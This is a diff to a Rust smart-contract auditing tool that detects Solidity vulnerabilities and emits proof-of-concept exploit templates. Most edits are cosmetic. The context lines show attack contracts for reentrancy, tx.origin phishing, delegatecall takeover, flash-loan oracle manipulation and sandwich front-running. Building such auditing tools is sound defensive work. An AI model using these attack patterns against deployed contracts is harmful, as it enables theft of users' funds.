@@ -3,8 +3,6 @@
 // Comprehensive vulnerability detection and exploit generation for Solidity contracts
 // ═══════════════════════════════════════════════════════════════════════════
 
-#![allow(clippy::needless_range_loop)]
-
 use serde::{Deserialize, Serialize};
 use std::fs;
 
@@ -203,7 +201,7 @@ impl SmartContractAuditor {
     }
 
     fn detect_integer_issues(&mut self) -> Result<(), String> {
-        println!("[AUDIT]  Scanning for integer overflow/underflow...");
+        println!("[AUDIT] 🔢 Scanning for integer overflow/underflow...");
 
         let lines: Vec<&str> = self.source_code.lines().collect();
         let mut unchecked_math = 0;
@@ -383,7 +381,7 @@ impl SmartContractAuditor {
     }
 
     fn detect_tx_origin(&mut self) -> Result<(), String> {
-        println!("[AUDIT]  Scanning for tx.origin usage...");
+        println!("[AUDIT] 🎭 Scanning for tx.origin usage...");
 
         if self.source_code.contains("tx.origin") {
             let lines: Vec<&str> = self.source_code.lines().collect();
@@ -449,7 +447,7 @@ impl SmartContractAuditor {
     }
 
     fn detect_selfdestruct_issues(&mut self) -> Result<(), String> {
-        println!("[AUDIT]  Scanning for selfdestruct issues...");
+        println!("[AUDIT] 💣 Scanning for selfdestruct issues...");
 
         if self.source_code.contains("selfdestruct") || self.source_code.contains("suicide") {
             self.vulnerabilities.push(Vulnerability {
@@ -474,7 +472,7 @@ impl SmartContractAuditor {
     }
 
     fn detect_weak_randomness(&mut self) -> Result<(), String> {
-        println!("[AUDIT]  Scanning for weak randomness...");
+        println!("[AUDIT] 🎲 Scanning for weak randomness...");
 
         let weak_sources = [
             "block.timestamp",
@@ -598,8 +596,8 @@ impl SmartContractAuditor {
         println!("[AUDIT] Scanning for ERC20-specific issues...");
 
         // Check for approve race condition
-        if self.source_code.contains("function approve")
-            && !self.source_code.contains("increaseAllowance") {
+        if self.source_code.contains("function approve") {
+            if !self.source_code.contains("increaseAllowance") {
                 self.vulnerabilities.push(Vulnerability {
                     vuln_type: VulnerabilityType::ERC20IssuesApproveRace,
                     severity: Severity::Medium,
@@ -617,6 +615,7 @@ impl SmartContractAuditor {
                     references: vec!["https://docs.google.com/document/d/1YLPtQxZu1UAvO9cZ1O2RPXBbT0mooh4DYKjA_jp-RLM".to_string()],
                 });
             }
+        }
 
         Ok(())
     }
@@ -650,7 +649,7 @@ impl SmartContractAuditor {
     }
 
     fn detect_mev_vulnerabilities(&mut self) -> Result<(), String> {
-        println!("[AUDIT]  Scanning for MEV vulnerabilities...");
+        println!("[AUDIT] 🏃 Scanning for MEV vulnerabilities...");
 
         // Check for missing deadline protection
         if (self.source_code.contains("swap") || self.source_code.contains("trade"))
@@ -724,7 +723,7 @@ impl SmartContractAuditor {
     }
 
     fn detect_oracle_manipulation(&mut self) -> Result<(), String> {
-        println!("[AUDIT]  Scanning for oracle manipulation risks...");
+        println!("[AUDIT] 🔮 Scanning for oracle manipulation risks...");
 
         if self.source_code.contains("oracle") || self.source_code.contains("getPrice") {
             let uses_single_source = !self.source_code.contains("median")
@@ -785,26 +784,28 @@ impl SmartContractAuditor {
     // ═══════════════════════════════════════════════════════════════════════
 
     fn generate_reentrancy_exploit(&self, _line: usize) -> String {
-        r#"
+        format!(
+            r#"
 // Reentrancy Exploit POC
-contract ReentrancyAttack {
+contract ReentrancyAttack {{
     TargetContract target;
-
-    constructor(address _target) {
+    
+    constructor(address _target) {{
         target = TargetContract(_target);
-    }
-
-    function attack() external payable {
-        target.vulnerableFunction{value: msg.value}();
-    }
-
-    receive() external payable {
-        if (address(target).balance >= 1 ether) {
+    }}
+    
+    function attack() external payable {{
+        target.vulnerableFunction{{value: msg.value}}();
+    }}
+    
+    receive() external payable {{
+        if (address(target).balance >= 1 ether) {{
             target.vulnerableFunction(); // Recursive call
-        }
-    }
-}
-        "#.to_string()
+        }}
+    }}
+}}
+        "#
+        )
     }
 
     fn generate_overflow_exploit(&self) -> String {
@@ -825,11 +826,11 @@ function exploit() public {
 // tx.origin Phishing Attack
 contract PhishingAttack {
     VulnerableContract target;
-
+    
     constructor(address _target) {
         target = VulnerableContract(_target);
     }
-
+    
     function phish() external {
         // Victim calls this, their tx.origin is checked by vulnerable contract
         target.withdrawAll();
@@ -845,7 +846,7 @@ contract PhishingAttack {
 // Delegatecall Takeover Exploit
 contract DelegatecallAttack {
     address public owner; // Storage slot 0
-
+    
     function pwn() public {
         owner = msg.sender; // Overwrites victim's storage slot 0
     }
@@ -866,17 +867,17 @@ contract FlashLoanAttack {
         uint256 loanAmount = 1000000 * 1e18;
         flashLoanProvider.flashLoan(loanAmount, address(this));
     }
-
+    
     function onFlashLoan(uint256 amount) external {
         // 2. Manipulate price by dumping tokens
         uniswapPair.swap(amount, 0, address(this), "");
-
+        
         // 3. Exploit vulnerable contract at manipulated price
         vulnerableContract.buyAtOraclePrice();
-
+        
         // 4. Restore price
         uniswapPair.swap(0, amount, address(this), "");
-
+        
         // 5. Repay flash loan + profit
         token.transfer(msg.sender, amount);
     }
@@ -894,7 +895,7 @@ contract SandwichAttack {
         // 2. Submit transaction with higher gas to execute first
         dex.swap(token0, token1, amount);
     }
-
+    
     function backrun(address victim) external {
         // 3. After victim's transaction, reverse the trade
         dex.swap(token1, token0, balance);
